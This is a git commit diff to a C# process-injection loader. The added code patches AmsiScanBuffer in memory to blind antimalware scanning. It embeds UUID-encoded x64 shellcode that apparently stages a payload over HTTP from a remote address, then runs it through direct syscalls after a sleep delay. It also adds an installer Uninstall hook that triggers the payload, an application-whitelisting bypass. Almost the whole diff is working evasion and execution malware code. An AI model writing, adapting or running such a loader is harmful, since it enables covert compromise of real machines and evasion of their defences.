c4e231e3ea3ef82c8938ea6c47ca2b29932cba34
0xfc <toskasstefanos@gmail.com>
2025-03-21 19:58:24 +0200

    Added etw amsi patch

--- solomon/Program.cs
+++ solomon/Program.cs
@@ -4,87 +4,32 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
-//using System.Configuration.Install;
 using System.Threading;
 using System.IO.Compression;
 using System.IO;
+
+using System.Configuration.Install;
 
 using Data = SharpWhispers.Data;
 using Syscall = Syscalls.Syscalls;
 
 namespace BasicProcessInjection
 {
-    class Program
+    [ComVisible(true), ClassInterface(ClassInterfaceType.AutoDual)]
+    public class Program
     {
 
-        //public static string base64String = "";       // Step 1: Decode Base64
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
 
 
-        //public static byte[] DecompressGzip(byte[] gzipBytes)
-        //{
-        //    using (var compressedStream = new MemoryStream(gzipBytes))
-        //    using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
-        //    using (var resultStream = new MemoryStream())
-        //    {
-        //        zipStream.CopyTo(resultStream);
-        //        return resultStream.ToArray();  // Return decompressed bytes
-        //    }
-        //}
-
-
-
-        //calc-thread64
-            public static byte[] Shellcode = ConvertUuidsToShellcode (new string[]{
-"e48348fc-e8f0-00cc-0000-415141505251",
-"d2314856-4865-528b-6048-8b5218488b52",
-"b70f4820-4a4a-314d-c948-8b72504831c0",
-"7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
-"48514152-528b-8b20-423c-4801d0668178",
-"0f020b18-7285-0000-008b-808800000048",
-"6774c085-0148-44d0-8b40-208b48184901",
-"56e350d0-314d-48c9-ffc9-418b34884801",
-"c03148d6-41ac-c9c1-0d41-01c138e075f1",
-"244c034c-4508-d139-75d8-58448b402449",
-"4166d001-0c8b-4448-8b40-1c4901d0418b",
-"58418804-5841-0148-d05e-595a41584159",
-"83485a41-20ec-5241-ffe0-5841595a488b",
-"ff4be912-ffff-485d-31db-5349be77696e",
-"74656e69-4100-4856-89e1-49c7c24c7726",
-"53d5ff07-4853-e189-535a-4d31c04d31c9",
-"ba495353-563a-a779-0000-0000ffd5e80f",
-"31000000-3239-312e-3638-2e34302e3133",
-"485a0037-c189-c749-c0bb-0100004d31c9",
-"036a5353-4953-57ba-899f-c600000000ff",
-"00c2e8d5-0000-4b2f-6b6e-30634f54536c",
-"575f3230-3572-3259-4942-535f51423451",
-"4d63584d-2d38-776f-3757-593766334274",
-"67585637-6670-6f4a-5735-355252386f47",
-"4f62664a-4879-786e-5a43-456845745855",
-"67356e53-316d-3939-7642-31785a6e535a",
-"6d695858-5857-3979-5a63-526454396564",
-"524c4b58-6f57-534c-6f31-306e776e5f71",
-"316c7778-4a45-3662-5863-647062574159",
-"6e657379-645a-5474-544c-78776c39586e",
-"79593170-6f75-6a35-5970-743749455839",
-"554a7265-2d67-4b63-3851-674368517548",
-"7a6b5430-7335-0056-4889-c1535a41584d",
-"4853c931-00b8-a832-8400-000000505353",
-"ebc2c749-2e55-ff3b-d548-89c66a0a5f48",
-"1f6af189-525a-8068-3300-004989e06a04",
-"ba495941-4675-869e-0000-0000ffd54d31",
-"485a53c0-f189-314d-c94d-31c9535349c7",
-"18062dc2-ff7b-85d5-c075-1f48c7c18813",
-"ba490000-f044-e035-0000-0000ffd548ff",
-"eb0274cf-e8aa-0055-0000-53596a405a49",
-"e2c1d189-4910-c0c7-0010-000049ba58a4",
-"0000e553-0000-d5ff-4893-53534889e748",
-"8948f189-49da-c0c7-0020-00004989f949",
-"899612ba-00e2-0000-00ff-d54883c42085",
-"66b274c0-078b-0148-c385-c075d258c358",
-"4959006a-c2c7-b5f0-a256-ffd590909090" });
-
-
-        static byte[] ConvertUuidsToShellcode(string[] uuids)
+        public static byte[] ConvertUuidsToShellcode(string[] uuids)
         {
             byte[] Shellcode = new byte[uuids.Length * 16];
             int index = 0;
@@ -108,36 +53,82 @@ namespace BasicProcessInjection
         }
 
 
-        static void Main(string[] args)
+        static void Main()
         {
 
-            //byte[] gzipBytes = Convert.FromBase64String(base64String);
+            // offset 0x83 => 0x74
+            // offset 0x95 => 0x75
 
-            // // Step 2: Decompress GZip
-            // byte[] Shellcode = DecompressGzip(gzipBytes);
-            //uint pid;
-            IntPtr HProc;
+            IntPtr lib = LoadLibrary("amsi.dll");
+            IntPtr amsi = GetProcAddress(lib, "AmsiScanBuffer");
+            IntPtr final = IntPtr.Add(amsi, 0x95);
+            uint old = 0;
+
+            VirtualProtect(final, (UInt32)0x1, 0x40, out old);
+
+            Console.WriteLine(old);
+            byte[] patch = new byte[] { 0x75 };
+            Marshal.Copy(patch, 0, final, 1);
+
+            VirtualProtect(final, (UInt32)0x1, old, out old);
 
 
-            //uint pid = 0;
+            Run();
+        }
+       
+
+        public static void Run()
+        {
+
+
+            byte[] Shellcode = ConvertUuidsToShellcode(new string[]{
+"e48348fc-e8f0-00cc-0000-415141505248",
+"4865d231-528b-4860-8b52-185156488b52",
+"b70f4820-4a4a-8b48-7250-4d31c94831c0",
+"7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
+"528b4852-4120-8b51-423c-4801d0668178",
+"0f020b18-7285-0000-008b-808800000048",
+"6774c085-0148-8bd0-4818-50448b402049",
+"56e3d001-314d-48c9-ffc9-418b34884801",
+"c03148d6-c141-0dc9-ac41-01c138e075f1",
+"244c034c-4508-d139-75d8-58448b402449",
+"4166d001-0c8b-4448-8b40-1c4901d0418b",
+"58418804-5841-0148-d05e-595a41584159",
+"83485a41-20ec-5241-ffe0-5841595a488b",
+"ff4be912-ffff-485d-31db-5349be77696e",
+"74656e69-4100-4856-89e1-49c7c24c7726",
+"53d5ff07-4853-e189-535a-4d31c04d31c9",
+"ba495353-563a-a779-0000-0000ffd5e80f",
+"31000000-3239-312e-3638-2e34302e3133",
+"485a0037-c189-c749-c0bb-0100004d31c9",
+"036a5353-4953-57ba-899f-c600000000ff",
+"0039e8d5-0000-482f-4469-727350386f45",
+"374b6f59-7651-6276-5443-5436777a3332",
+"73636e56-4251-5367-3178-57555f67752d",
+"79656d43-5668-5a38-786b-69684f610048",
+"5a53c189-5841-314d-c953-48b80032a884",
+"00000000-5350-4953-c7c2-eb552e3bffd5",
+"6ac68948-5f0a-8948-f16a-1f5a52688033",
+"89490000-6ae0-4104-5949-ba75469e8600",
+"ff000000-4dd5-c031-535a-4889f14d31c9",
+"53c9314d-4953-c2c7-2d06-187bffd585c0",
+"c7481f75-88c1-0013-0049-ba44f035e000",
+"ff000000-48d5-cfff-7402-ebaae8550000",
+"6a595300-5a40-8949-d1c1-e21049c7c000",
+"49000010-58ba-53a4-e500-000000ffd548",
+"48535393-e789-8948-f148-89da49c7c000",
+"49000020-f989-ba49-1296-89e200000000",
+"8348d5ff-20c4-c085-74b2-668b074801c3",
+"d275c085-c358-6a58-0059-49c7c2f0b5a2",
+"90d5ff56-9090-9090-9090-909090909090" });
 
 
 
-            //byte[] Sh = Shellcode;
+        IntPtr HProc;
+
             IntPtr ShellcodeSize = (IntPtr)Shellcode.Length;
 
-
-           
-                // Local Process
-                HProc = (IntPtr)(-1);
-
-            
-
-            /* Allocate */
-            //Console.WriteLine("");
-            //Console.WriteLine("==== Allocating Memory ====");
-
-
+            HProc = (IntPtr)(-1);
 
             IntPtr BaseAddress = IntPtr.Zero;
             IntPtr AllocationSize = ShellcodeSize;
@@ -150,23 +141,6 @@ namespace BasicProcessInjection
                 ref AllocationSize,
                 Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,Data.Win32.WinNT.PAGE_READWRITE);
 
-
-
-            //if (retValue != Data.Native.NTSTATUS.Success)
-            //{
-            //    Console.WriteLine("Error Allocating memory!");
-            //    Console.WriteLine("[*] Return Value : " + retValue);
-            //    return;
-            //}
-
-            //Console.WriteLine("[*] Allocated : " + AllocationSize + " bytes");
-            //Console.WriteLine("[>] Allocation Address : " + string.Format("{0:X}", BaseAddress.ToInt64()) + "\n");
-
-
-
-            /* Write Memory */
-            //Console.WriteLine("");
-            //Console.WriteLine("==== Writing Shellcode in the Remote Process.. ====");
 
 
             // Get Pointer to local shellcode
@@ -183,37 +157,14 @@ namespace BasicProcessInjection
             res = Syscall.NtWriteVirtualMemory(HProc, BaseAddress, Shellcodeptr, (uint)ShellcodeSize);
 
 
-            //if (res != (uint)ShellcodeSize)
-            //{
-            //    Console.WriteLine("Error Writing memory!");
-            //    Console.WriteLine("[*] Return Value : " + res);
-            //    return;
-            //}
-
-
-            /* Protect Memory - RX */
-            //Console.WriteLine("");
-            //Console.WriteLine("==== Setting Memory to RX.. ====");
-
-            // NtProtectVirtualMemory will change the protection of the whole page
-            // The value of AllocationSize will be overwritten
             AllocationSize = ShellcodeSize;
             IntPtr ProtectAddress = BaseAddress;
             Syscall.NtProtectVirtualMemory(HProc, ref ProtectAddress, ref AllocationSize, Data.Win32.WinNT.PAGE_EXECUTE_READ);
-
-            /* RUN */
-
-
-            // Execute   
-            //Console.WriteLine("");
-            //Console.WriteLine("==== Creating Thread.. ====");
+            Thread.Sleep(10000);
 
             IntPtr HThread = IntPtr.Zero;
             res = (uint)Syscall.NtCreateThreadEx(ref HThread, Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, (IntPtr)0, HProc, BaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
 
-            //Console.WriteLine("");
-            //Console.WriteLine("Press any key to exit..");
-            //Console.ReadLine();
 
             WaitForSingleObject(HThread, 0xFFFFFFFF);
 
@@ -224,5 +175,18 @@ namespace BasicProcessInjection
         
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
+    }
+
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class MyInstaller : Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            base.Uninstall(savedState);
+            //Class1.print();
+            Program.Run();
+            // Do your thing...
+        }
     }
 }
